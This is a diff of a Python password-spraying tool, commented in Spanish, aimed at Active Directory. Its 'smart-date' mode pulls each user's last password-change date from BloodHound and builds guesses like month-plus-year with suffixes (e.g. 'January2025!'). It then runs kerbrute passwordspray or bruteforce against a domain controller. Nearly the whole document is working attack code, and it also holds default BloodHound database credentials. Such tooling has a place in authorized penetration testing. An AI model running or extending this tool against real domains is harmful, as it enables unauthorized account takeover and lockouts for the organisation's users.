@@ -8,7 +8,6 @@ import sys
 import logging
 from bloodhound_cli import BloodHoundACEAnalyzer
 import curses
-import wrapper
 from datetime import datetime,timezone
 
 # Configuración inicial de logging: mostramos logs a partir de INFO
@@ -98,7 +97,6 @@ def curses_menu(stdscr, title, options):
     """
     curses.curs_set(0)  # ocultamos el cursor
     selected = 0
-
     while True:
         stdscr.clear()
         stdscr.addstr(0, 0, title, curses.A_BOLD)
@@ -108,7 +106,6 @@ def curses_menu(stdscr, title, options):
             else:
                 stdscr.addstr(idx+2, 2, f"  {option}")
         stdscr.refresh()
-
         key = stdscr.getch()
         if key in [curses.KEY_UP, ord('k')]:
             selected = (selected - 1) % len(options)
@@ -119,54 +116,57 @@ def curses_menu(stdscr, title, options):
 
 def smart_date_menu():
     """
-    Interfaz interactiva con curses para seleccionar el idioma y el modo de formateo ("months")
-    para el spraying. Retorna una tupla (language, spray_format_option).
-    spray_format_option puede ser uno de los formatos definidos o "All".
+    Interfaz interactiva con curses para seleccionar:
+      - El idioma (English o Spanish)
+      - La presentación del mes: Lower (e.g., january2025) o Upper (e.g., January2025)
+      - El modo de formateo (por ahora, solo "months") y el formato deseado.
+    Retorna una tupla (language, month_case, spray_format_option).
     """
     # Opciones para el idioma:
     languages = ["English", "Spanish"]
-
-    # Opciones para el modo; por ahora solo "months"
-    mode_options = ["months"]  # Se podrá extender a seasons, weekdays, etc.
-
-    # Lista de formatos disponibles para months.
-    # Se muestran dos grupos (upper-case y lower-case) y una opción "All" para generar todas las variantes.
+    # Opciones para la presentación del mes:
+    case_options = ["Lower (e.g., january2025)", "Upper (e.g., January2025)"]
+    # Opciones para el modo (por ahora solo "months")
+    mode_options = ["months"]
+    # Lista de formatos disponibles para months usando placeholder genérico "month"
     months_formats = [
-        "January{full_year}", "January.{full_year}", "January{full_year}.", "January@{full_year}", "January{full_year}!",
-        "January{year_short}", "January.{year_short}", "January{year_short}.", "January@{year_short}", "January{year_short}!",
-        "january{full_year}", "january.{full_year}", "january{full_year}.", "january@{full_year}", "january{full_year}!",
-        "january{year_short}", "january.{year_short}", "january{year_short}.", "january@{year_short}", "january{year_short}!",
+        "{month}{full_year}", "{month}.{full_year}", "{month}{full_year}.", "{month}@{full_year}", "{month}{full_year}!",
+        "{month}{year_short}", "{month}.{year_short}", "{month}{year_short}.", "{month}@{year_short}", "{month}{year_short}!",
         "All"
     ]
 
-    # Usamos wrapper de curses para obtener las selecciones
     def curses_logic(stdscr):
         lang_idx = curses_menu(stdscr, "Select language:", languages)
-        # Por ahora asumimos que solo se implementa "months"
+        case_idx = curses_menu(stdscr, "Select month case:", case_options)
         mode_idx = curses_menu(stdscr, "Select spray mode:", mode_options)
         fmt_idx = curses_menu(stdscr, "Select months spray format:", months_formats)
-        return languages[lang_idx], months_formats[fmt_idx]
+        month_case = "lower" if case_idx == 0 else "upper"
+        return languages[lang_idx], month_case, months_formats[fmt_idx]
 
-    return wrapper(curses_logic)
+    return curses.wrapper(curses_logic)
 
-# --- Función que genera la lista de spray en modo smart-date ---
+def smart_date_formats():
+    """Devuelve la lista de formatos para months con el placeholder 'month'."""
+    return [
+        "{month}{full_year}", "{month}.{full_year}", "{month}{full_year}.", "{month}@{full_year}", "{month}{full_year}!",
+        "{month}{year_short}", "{month}.{year_short}", "{month}{year_short}.", "{month}@{year_short}", "{month}{year_short}!",
+        "All"
+    ]
+
 def generate_spray_list(analyzer, domain, smart_date_params):
     """
     Usa la API de bloodhound-cli para obtener para cada usuario la fecha del pwdlastset.
-    Luego, dependiendo del mes extraído y el formato seleccionado, genera una contraseña.
-    smart_date_params es una tupla (language, format_option).
-    Si format_option es "All", se generan todas las variantes.
+    Luego, dependiendo del mes extraído y del formato seleccionado, genera una contraseña.
+    smart_date_params es una tupla (language, month_case, format_option).
+    Si format_option es "All", se generan todas las variantes (concatenadas por comas).
     Retorna una lista de cadenas en el formato "user:password".
     """
-    language, fmt_option = smart_date_params
+    language, month_case, fmt_option = smart_date_params
 
-    # Obtén los datos de password last change de bloodhound-cli
-    # Aquí se asume que el método get_password_last_change retorna:
-    #   [{ 'user': <username>, 'password_last_change': <pwdlastset>, 'when_created': <whencreated> }, ...]
+    # Obtén los datos de password last change desde bloodhound-cli
     data = analyzer.get_password_last_change(domain)
-
     spray_lines = []
-    # Definición de mapeo de meses para Spanish si es necesario.
+    # Mapeo de meses para Spanish.
     spanish_months = {
         "January": "enero", "February": "febrero", "March": "marzo", "April": "abril",
         "May": "mayo", "June": "junio", "July": "julio", "August": "agosto",
@@ -179,7 +179,6 @@ def generate_spray_list(analyzer, domain, smart_date_params):
         try:
             ts_float = float(ts)
             if ts_float == 0:
-                # Si pwdlastset es 0, usar whencreated
                 wc = record.get('when_created')
                 dt = datetime.fromtimestamp(float(wc), tz=timezone.utc)
             else:
@@ -188,42 +187,34 @@ def generate_spray_list(analyzer, domain, smart_date_params):
             logger.error(f"Error converting timestamp for user {user}: {e}")
             continue
 
-        # Extraer mes y año de dt
-        # Si se selecciona English, se usa dt.strftime("%B") para mes con mayúscula;
-        # si Spanish, se mapea al valor en minúsculas.
-        month = dt.strftime("%B")
+        # Obtener el mes en inglés usando dt.strftime("%B")
+        month_eng = dt.strftime("%B")
+        # Para Spanish, mapea al mes en minúsculas; para English se usa el original.
         if language == "Spanish":
-            month = spanish_months.get(month, month.lower())
+            base_month = spanish_months.get(month_eng, month_eng.lower())
+        else:
+            base_month = month_eng
+        # Ajustar el case según la opción seleccionada.
+        if month_case == "lower":
+            month_final = base_month.lower()
+        else:
+            month_final = base_month.capitalize()
+
         year_full = dt.strftime("%Y")
         year_short = dt.strftime("%y")
 
-        # Función auxiliar para aplicar un formato
         def apply_format(fmt_str):
-            # fmt_str es una plantilla con placeholders {full_year} o {year_short}
-            return fmt_str.replace("{full_year}", year_full).replace("{year_short}", year_short).replace("January", month).replace("january", month)
+            # Utiliza el método .format() para reemplazar los placeholders.
+            return fmt_str.format(month=month_final, full_year=year_full, year_short=year_short)
 
-        # Si se seleccionó "All", generar todas las variantes (excepto la opción "All" en sí)
         if fmt_option == "All":
-            # Excluir la última opción de la lista (que es "All")
             variants = [fmt for fmt in smart_date_formats() if fmt != "All"]
             spray_candidates = [apply_format(fmt) for fmt in variants]
-            # Se eligen, por ejemplo, la primera variante o se podría concatenar
-            # Aquí concatenamos todas las variantes separadas por comas
             password = ",".join(spray_candidates)
         else:
             password = apply_format(fmt_option)
         spray_lines.append(f"{user}:{password}")
     return spray_lines
-
-def smart_date_formats():
-    """Devuelve la lista de formatos para months."""
-    return [
-        "January{full_year}", "January.{full_year}", "January{full_year}.", "January@{full_year}", "January{full_year}!",
-        "January{year_short}", "January.{year_short}", "January{year_short}.", "January@{year_short}", "January{year_short}!",
-        "january{full_year}", "january.{full_year}", "january{full_year}.", "january@{full_year}", "january{full_year}!",
-        "january{year_short}", "january.{year_short}", "january{year_short}.", "january@{year_short}", "january{year_short}!",
-        "All"
-    ]
 
 def write_temp_spray_file(lines):
     """
@@ -269,7 +260,12 @@ def run_kerbrute(domain, dc_ip, temp_users_file, spray_password, use_user_as_pas
     if use_user_as_pass:
         cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, "--user-as-pass", temp_users_file]
     else:
-        cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, temp_users_file, spray_password]
+        if spray_password:
+            # Usar el modo passwordspray con contraseña fija.
+            cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, temp_users_file, spray_password]
+        else:
+            # En modo smart-date, no se suministra contraseña; se usa "bruteforce"
+            cmd = ["kerbrute", "bruteforce", "-d", domain, "--dc", dc_ip, temp_users_file]
     
     if output_dir:
         cmd.extend(["-o", output_dir])
@@ -320,21 +316,14 @@ def main():
 
     args = parser.parse_args()
 
-    if args.debug:
-        logging.getLogger().setLevel(logging.DEBUG)
-        logger.debug("Modo debug activado. Mostrando información más detallada.")
-
-    if not args.p and not (args.user_as_pass_low or args.user_as_pass_up) and not args.smart_date:
-        parser.error("Debe especificar una contraseña de spray con -p, o una opción --user-as-pass o --smart-date")
-
     # Si se especifica --debug, subimos el nivel de logging a DEBUG
     if args.debug:
         logging.getLogger().setLevel(logging.DEBUG)
         logger.debug("Modo debug activado. Mostrando información más detallada.")
 
-    # Verificamos que se especifique el método de spraying (contraseña fija o user-as-pass)
-    if not args.p and not (args.user_as_pass_low or args.user_as_pass_up):
-        parser.error("Debe especificar una contraseña de spray con -p o una opción --user-as-pass (--user-as-pass-low o --user-as-pass-up)")
+    # Validación: se debe especificar -p o --user-as-pass o --smart-date
+    if not args.p and not (args.user_as_pass_low or args.user_as_pass_up) and not args.smart_date:
+        parser.error("Debe especificar una contraseña de spray con -p, o una opción --user-as-pass o --smart-date")
 
     # Si se proporcionan las credenciales para netexec, primero comprobamos el Account Lockout Threshold
     if args.ul and args.pl:
@@ -372,20 +361,6 @@ def main():
             if not eligible_users:
                 logger.error("La lista de usuarios proporcionada está vacía.")
                 sys.exit(1)
-
-    # Si --smart-date está activado, usar la integración con bloodhound-cli.
-    if args.smart_date:
-        logger.info("[*] Modo smart-date activado. Obteniendo datos de password last change desde bloodhound-cli...")
-        # Configuración para BloodHoundACEAnalyzer. Ajusta según tu entorno.
-        bh_uri = "bolt://localhost:7687"
-        bh_user = "neo4j"
-        bh_password = "bloodhound"
-        analyzer = BloodHoundACEAnalyzer(bh_uri, bh_user, bh_password)
-        # Llama a la interfaz interactiva con curses para seleccionar idioma y formato.
-        smart_date_params = smart_date_menu()  # Retorna (language, format_option)
-        logger.info(f"[*] Se seleccionó: Idioma={smart_date_params[0]}, Formato de spray='{smart_date_params[1]}'")
-        spray_list = generate_spray_list(analyzer, args.d, smart_date_params)
-        analyzer.close()
     else:
         logger.info("[*] No se proporcionó autenticación para netexec, se usará la lista de usuarios directamente.")
         eligible_users = list(read_enabled_users(args.u))
@@ -393,9 +368,31 @@ def main():
             logger.error("La lista de usuarios proporcionada está vacía.")
             sys.exit(1)
 
-    # Se muestra el número total de usuarios elegibles en salida INFO
-    logger.info("[*] Número de usuarios elegibles para password spraying: %d", len(eligible_users))
-    # Si se activa --debug, se listan todos los usuarios
+    # Ramas según el modo de spraying
+    if args.smart_date:
+        logger.info("[*] Modo smart-date activado. Obteniendo datos de password last change desde bloodhound-cli...")
+        # Configuración para BloodHoundACEAnalyzer (ajusta según tu entorno)
+        bh_uri = "bolt://localhost:7687"
+        bh_user = "neo4j"
+        bh_password = "bloodhound"
+        analyzer = BloodHoundACEAnalyzer(bh_uri, bh_user, bh_password)
+        # Llama a la interfaz interactiva con curses para seleccionar idioma y formato.
+        smart_date_params = smart_date_menu()  # Retorna (language, format_option)
+        logger.info(f"[*] Se seleccionó: Idioma={smart_date_params[0]}, Formato de spray='{smart_date_params[1]}'")
+        # Obtenemos los datos de password last change para definir los usuarios elegibles
+        data = analyzer.get_password_last_change(args.d)
+        # Extraemos los usuarios (los habilitados según bloodhound-cli)
+        eligible_users = [record['user'] for record in data]
+        spray_list = generate_spray_list(analyzer, args.d, smart_date_params)
+        analyzer.close()
+        logger.info("[*] Número de usuarios para spraying (smart-date): %d", len(eligible_users))
+        temp_file = write_temp_spray_file(spray_list)
+    else:
+        logger.info("[*] Número de usuarios elegibles para password spraying: %d", len(eligible_users))
+        spray_list = [f"{user}:{args.p}" for user in eligible_users]
+        temp_file = write_temp_users_file(eligible_users)
+
+    # Si se activa --debug, se listan todos los usuarios elegibles
     if args.debug:
         logger.debug("[*] Usuarios elegibles para password spraying:")
         for user in eligible_users:
@@ -409,13 +406,13 @@ def main():
         eligible_users = [user.capitalize() for user in eligible_users]
         use_user_as_pass = True
 
-    temp_file = write_temp_users_file(eligible_users)
     logger.info(f"[*] Archivo temporal generado: {temp_file}")
 
     kerbrute_domain = args.target_domain if args.target_domain else args.d
 
     logger.info("[*] Ejecutando kerbrute passwordspray...")
-    run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, args.p, use_user_as_pass=use_user_as_pass, output_dir=args.output)
+    run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, args.p if not args.smart_date else None,
+                 use_user_as_pass=use_user_as_pass, output_dir=args.output)
 
     os.remove(temp_file)
     logger.info("[*] Proceso completado.")
